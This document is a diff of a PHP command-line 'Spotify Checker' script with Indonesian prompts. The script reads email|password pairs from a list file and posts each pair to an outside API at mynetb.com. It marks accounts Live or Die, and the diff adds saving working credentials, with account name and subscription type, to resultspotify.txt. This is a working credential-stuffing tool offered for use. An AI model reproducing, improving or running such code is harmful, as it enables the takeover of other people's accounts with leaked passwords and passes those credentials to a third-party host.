@@ -38,7 +38,7 @@ function curl ($url, $data) {
 echo "============================================\n";
 echo "              Spotify Checker "; 
 echo "\n============================================\n";
-echo "Created by : \033[92mMr.Dzer0 \n\033[0mAPI From   : \033[95mKirnath Morscheck \033[0m\n";
+echo "Created by : \033[92mMr.Dzer0 \n\033[0mAPI From   : \033[95mKirnath Morscheck \033[0m\nCredit     : @2019\n";
 echo "============================================\n";
 echo "Nama File list : ";
 $namafile = trim(fgets(STDIN));
@@ -46,25 +46,33 @@ $time_start = microtime_float();
 $file = "$namafile.txt";
 $ndata = array_sum(explode(' ', microtime()));
 $baris = count(file($file));
-$jumlah= 0;
+$jumlah= 0; $live=0; $mati=0;
 $myfile = fopen("$namafile.txt", "r") or die("Unable to open file!");
-while(! feof($myfile)){ 
+while(! feof($myfile)){
 $jumlah+=1;
+	$path = 'resultspotify.txt';
+    $fh = fopen($path,"a+");
+ 
 $referrer= trim(fgets($myfile));
+list($email,$password)=explode('|',$referrer);	
 		$regis = curl("http://mynetb.com/api/spot.php", "email=$email&password=$password");
 	    // echo $result = $regis;
 		$bates = '/"[^"]*"/m';
-		$time_end = microtime_float(); $time = $time_end - $time_start;  $nana = substr($time,0,3);		
+		$time_end = microtime_float(); $time = $time_end - $time_start;  $nana = substr($time,0,4);		
 		preg_match_all($bates, $regis, $matches, PREG_SET_ORDER, 0);
 		$nil = $matches[1][0]; $nama = $matches[5][0]; $sub = $matches[7][0]; $erorr = $matches[3][0];
 		if(preg_match("/success/i", $nil)){
-			echo "[\033[92mLive\033[0m] $email | $password ( eror=$erorr , Nama=$nama , jenis=$sub ) \n";
+			echo "[\033[92mLive\033[0m] $email | $password | eror=$erorr | Nama=$nama | jenis=$sub "; $live+=1;
+			$hasil="[Live] $email | $password | eror=$erorr | Nama=$nama | jenis=$sub \n";
+			fwrite($fh,$hasil); // Write information to the file 
+			fclose($fh);
 		}
 		else { 
-		echo "[\033[91mDie\033[0m] $email | $password | ";
+		echo "[\033[91mDiee\033[0m] $email | $password "; $mati+=1;
 		}
-		echo "$nana"."s\n";
+		echo "\033[92m($jumlah/$baris) \033[95m$nana"."s\033[0m\n";
 	}
-	echo "banyak data : $jumlah";
-
+echo "============================================\n";	
+echo "Account \033[92mLive:$live \033[0mdan account \033[91mDie:$mati\033[0m";
+echo "\nResult Live Disimpan Pada File \033[92mresultspotify.txt\033[0m\n";	
 ?>
